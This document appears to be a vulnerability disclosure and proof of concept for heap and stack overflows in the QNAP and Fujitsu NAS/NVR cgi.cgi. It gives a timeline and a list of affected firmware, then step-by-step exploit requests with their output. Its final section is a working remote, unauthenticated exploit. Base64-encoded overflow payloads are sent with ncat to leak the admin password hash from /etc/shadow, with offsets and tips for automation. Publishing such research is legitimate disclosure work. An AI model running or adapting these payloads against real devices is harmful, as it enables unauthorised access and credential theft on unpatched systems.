@@ -1,0 +1,232 @@
+Device Model: QNAP VioStor NVR, QNAP NAS, Fujitsu Celvin NAS (May be additional re-branded)
+Attack Vector: Remote
+Attack Models: 
+1. Classic Heap Overflows
+2. Classic Stack Overflow
+3. Heap Feng Shui Overflow
+4. "Heack Combo" (Heap / Stack Combination) Overflow
+
+
+[Timeline]
+07/01/2017:
+QNAP contacted me after my post to Bugtraq 31/12/2016 (http://seclists.org/bugtraq/2017/Jan/5).
+Provided additional details, never heard anything back from QNAP.
+(The patched FW versions Iâ€™ve found out by myself, no feedback from QNAP)
+
+29/01/2017:
+Sent this document to QNAP <security@qnap.com>, asked for feedback and also if they have any objections before publish
+
+31/01/2017:
+No reply.
+- Frankly speaking - ignorance; next batch will be Full Disclosure without any prior notice nor reply to QNAP (oOoo).
+
+[Vulnerable]
+QNAP VioStor NVR: QVR 5.1.x (Patched?)
+QNAP NAS: QTS 4.3.2 Beta (Patched?)
+QNAP NAS: QTS older than 4.2.3 (build 20170121)
+Fujitsu Celvin NAS: older than 4.2.3 (build 20170110)
+
+[Not Vulnerable]
+QNAP NAS: QTS >= 4.2.3 (build 20170121)
+Fujitsu Celvin NAS: >= 4.2.3 (build 20170110)
+
+[Vendor security alert]
+https://www.qnap.com/en/support/con_show.php?cid=108
+
+[Vendor URL]
+https://www.qnap.com/
+http://www.qnapsecurity.com/
+http://www.fujitsu.com/fts/products/computing/peripheral/accessories/storage/
+
+Note: All hardcoded examples below, made with TS-251+ QTS 4.2.2 (Build 20161214)
+
+
+===[ 1. Classic Heap Overflows ]===
+
+1. Both the tags "u" (user) and "p" (password) suffer of heap overflow, that alone allows us to overwrite wilderness top chunk size.
+2. The tag "pp" (sysApp) suffer of stack overflow, that alone allows to us to overwrite libc_argv[0].
+
+Note: Local shown below, but can of course be triggered remote as well
+
+
+/* Heap #1 to overwrite the heap wilderness top chunk size */
+
+# export QUERY_STRING="u=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff"                                  
+# ./cgi.cgi 
+*** glibc detected *** ./cgi.cgi: double free or corruption (out): 0x0806b0d0 ***
+
+
+/* Heap #2 to overwrite the heap wilderness top chunk size */
+
+# export QUERY_STRING="u=admin&p=`for((i=0;i<260;i++));do echo -en "A";done`%ff%ff%ff%ff"
+# ./cgi.cgi 
+*** glibc detected *** ./cgi.cgi: double free or corruption (out): 0x0806b2a0 ***
+
+
+
+===[ 2. Classic Stack Overflow ]===
+
+/* Stack Overflow to overwrite libc_argv[0] address pointer for reading shadow password */
+
+# export QUERY_STRING="u=admin&pp=`for((i=0;i<4468;i++));do echo -en "A";done`%7e%c7%06%08"
+# ./cgi.cgi                                                                                
+Content-type: text/xml
+
+<?xml version="1.0" encoding="UTF-8" ?>
+<QDocRoot version="1.0">
+<authPassed><![CDATA[0]]></authPassed></QDocRoot>
+*** stack smashing detected ***: $1$$CoERg7ynjYLsj2j4glJ34. terminated
+Aborted
+
+
+As we can see above, the implemented GLIBC heap/stack protections works quite sufficient, pretty much nothing interesting can be achieved.
+But, when we start to combining vulnerabilities, flaws and near functions with each other, things starting to get a bit more interesting.
+
+
+
+===[ 3. Heap Feng Shui with Heap #1 and #2 Overflow ]===
+
+/* Heap overflow with freed junk chunks, to overwrite next heap chunk header */
+
+One of the first functions that runs in the CGI, is CGI_Get_Input(), this function takes all our input to the CGI and allocates memory on the heap for later use with CGI_Find_Parameter(); This allow us to create junk memory chunks more or less wherever we would like to have them, have them freed, and then later have them allocated for our use.
+
+The for() loop with char "B" will create used and freed space before "p" at heap by CGI_Get_Input();
+
+The upcoming calloc() for "u" will use this space, and the content in "u" will be copied here and overflow into "p":s heap chunk header.
+[The abort() happens in <fgetpwent+402>: malloc() from Get_Exact_NAS_User_Name() call, and not in "p":s calloc()]
+
+/* Controlling: eax, edx, esi */
+# export QUERY_STRING="u=`for((i=0;i<80;i++));do echo -en "A";done`%fc%ff%ff%ff%fc%ff%ff%ffCCCC%6c%b1%06%08&QNAP=`for((i=0;i<32;i++));do echo -en "B";done`&p=PPPP"
+# ./cgi.cgi
+*** glibc detected *** /home/httpd/cgi-bin/cgi.cgi: corrupted double-linked list: 0x0806b154 ***
+
+
+
+Below I will demonstrate another interesting combination found while exploring,
+that easily can be exploited remotely without credentials and without any prior knowledge of the remote target.
+
+
+
+===[ 4. "Heack Combo" (Heap / Stack Combination) Overflow ]===
+
+/* Combined heap overflow #2 with base64 decoded stack overwrite, to remotely calculate and retrieve shadowed admin (root) password */
+
+We will here combine the "GLIBC detected" abort message in GNU LIBC thatâ€™s triggered by an Heap Overflow, together with base64 encoded request string to cgi.cgi in QNAP devices, where the internal b64_Decode() function will (right after the heap overflow) be called and do an stack overwrite of address pointer for libc_argv[0], with the address we choose, which will allow us to read a string almost anywhere.
+
+In this PoC we are using the address for the heap loaded admin (root) /etc/shadow password, to remotely read this string for displaying instead of the program name.
+
+The critical part is to correctly align the request with the address pointer for libc_argv[0], and below you will find guidance for success.
+
+Notes:
+1. Sending 0x00-0xff to the stack will work just fine, since the request for "p" will be base64 decoded. (theoretically, we could rewrite the stack as how we would like to have it)
+2. Iâ€™m using HTTPS/SSL to have some privacy while fuzzing, only to show some people that HTTPS/SSL donâ€™t make them secure by default. (HTTP works of course too)
+3. Right before and after the address pointer for libc_argv[0], we have (harmless?) segfaults in strlen() / getenv() due to reading of invalid addresses.
+4. The "\nHost: Qâ€ is needed with HTTPS/SSL, could be removed when using HTTP, otherwise the PoC sometimes may not work as expected. *sigh*
+5. Since the given pattern for reading is static, automated tool are quite easy to develop. (with slightly adjustment of the offset for correctly reading)
+6. Fingerprinting is extremely easy with the request: "GET /cgi-bin/authLogin.cgi HTTP/1.0" (provides XML list with all relevant details)
+7. This PoC will not work with devices who has ASLR enabled for heap. *doh*
+
+Credits:
+QNAP, to the combination of heap overflow with base64 decoded stack overwrite, for letting us write where we want to read.
+GLIBC, who give us quite vital information to calculate with, that allow us to point our reading correctly, and then reading what we want.
+
+
+Now to the demonstration.
+
+
+[==== (1) ====]
+
+[Four and more bytes off below the address pointer for libc_argv[0]]
+
+/*
+You should start with fairly low number in the for() loop (around 2000 - 3000 should be fine) and work your way up to the breaking point between #1 and #2.
+
+Note:
+In the example we start with 4464 in the for() loop, only to clearly show the breaking point between #1 and #2.
+*/
+
+Example:
+$ echo -en "GET /cgi-bin/cgi.cgi?u=admin&p=`QN=$(for((i=0;i<4464;i++));do echo -en "\xff";done) ; AP=$"\x41\x41\x41\x41"; echo -en "$QN$AP" | base64 -w 0` HTTP/1.0\nHost: Q\n\n"  | ncat --ssl 192.168.5.7 443
+HTTP/1.1 200 OK
+Date: Sun, 08 Jan 2017 11:40:06 GMT
+*** glibc detected *** cgi.cgi: free(): invalid next size (normal): 0x0806e508 ***
+
+
+[==== (2) ====]
+
+[Three or two bytes off below the address pointer for libc_argv[0]]
+
+/*
+Note now the below "*** glibc detected ***" - it doesnâ€™t write the program name as above in #1, this is very important first step to look for.
+
+Note:
+Two bytes off can sporadicly generate segfault, so donâ€™t be fooled to believe you are in #3.
+
+Recommending firstly to exactly find the first breaking point between #1 and #2 (program name).
+*/
+
+Example (three off below):
+$ echo -en "GET /cgi-bin/cgi.cgi?u=admin&p=`QN=$(for((i=0;i<4465;i++));do echo -en "\xff";done) ; AP=$"\x41\x41\x41\x41"; echo -en "$QN$AP" | base64 -w 0` HTTP/1.0\nHost: Q\n\n" | ncat --ssl 192.168.5.7 443 
+HTTP/1.1 200 OK
+Date: Sun, 08 Jan 2017 11:41:12 GMT
+*** glibc detected *** : free(): invalid next size (normal): 0x0806e508 ***
+
+Example (two off below):
+$ echo -en "GET /cgi-bin/cgi.cgi?u=admin&p=`QN=$(for((i=0;i<4466;i++));do echo -en "\xff";done) ; AP=$"\x41\x41\x41\x41"; echo -en "$QN$AP" | base64 -w 0` HTTP/1.0\nHost: Q\n\n" | ncat --ssl 192.168.5.7 443 
+HTTP/1.1 200 OK
+Date: Sun, 08 Jan 2017 11:41:52 GMT
+*** glibc detected *** : free(): invalid next size (normal): 0x0806e508 ***
+
+
+[==== (3) ====]
+
+[One byte off below the address pointer for libc_argv[0]]
+
+/*
+Very important step, segfault in strlen() and we need now add one more byte to correctly overwrite the address pointer for libc_argv[0]
+*/
+
+Example (one off below):
+$ echo -en "GET /cgi-bin/cgi.cgi?u=admin&p=`QN=$(for((i=0;i<4467;i++));do echo -en "\xff";done) ; AP=$"\x41\x41\x41\x41"; echo -en "$QN$AP" | base64 -w 0` HTTP/1.0\nHost: Q\n\n" | ncat --ssl 192.168.5.7 443 
+HTTP/1.1 200 OK
+Date: Sun, 08 Jan 2017 11:42:26 GMT
+Content-Length: 0
+Connection: close
+Content-Type: text/plain
+
+
+[==== (4) ====]
+
+/*
+The address we looking for can be calculated from above heap message in #2 (0x0806e508) and subtracted with below offset.
+
+Fixed offset (more or less)
+NASX86: 0x16b2
+NASARM: 0x1562
+
+NASX86 example:
+If we subtract the offset: 0x0806e508 - 0x16b2 = 0x0806ce56; We should directly read the hash. (if not, adjust the reading slightly with the offset)
+*/
+
+Example (correctly aligned):
+$ echo -en "GET /cgi-bin/cgi.cgi?u=admin&p=`QNAP=$(for((i=0;i<4468;i++));do echo -en "\xff";done) ; PWNED=$"\x56\xce\x06\x08"; echo -en "$QNAP$PWNED" | base64 -w 0` HTTP/1.0\nHost: Q\n\n" | ncat --ssl 192.168.5.7 443 
+HTTP/1.1 200 OK
+Date: Sun, 08 Jan 2017 11:43:08 GMT
+*** glibc detected *** $1$$CoERg7ynjYLsj2j4glJ34.: free(): invalid next size (normal): 0x0806e510 ***
+
+
+[==== (5) ====]
+
+/*
+If we added one or more bytes above the address pointer for libc_argv[0], "400 Bad Request" will be generated or no output with "200 OK" as in #3.
+
+If you donâ€™t get expected results (or not any results at all), you are most probably here.
+*/
+
+[One byte off or more above the address pointer for libc_argv[0]]
+
+Example (one or more off above):
+$ echo -en "GET /cgi-bin/cgi.cgi?u=admin&p=`QN=$(for((i=0;i<4469;i++));do echo -en "\xff";done) ; AP=$"\x56\xce\x06\x08"; echo -en "$QN$AP" | base64 -w 0` HTTP/1.0\nHost: Q\n\n" | ncat --ssl 192.168.5.7 443 
+HTTP/1.1 400 Bad Request
+Date: Sun, 08 Jan 2017 11:45:01 GMT
+Server: http server 1.0
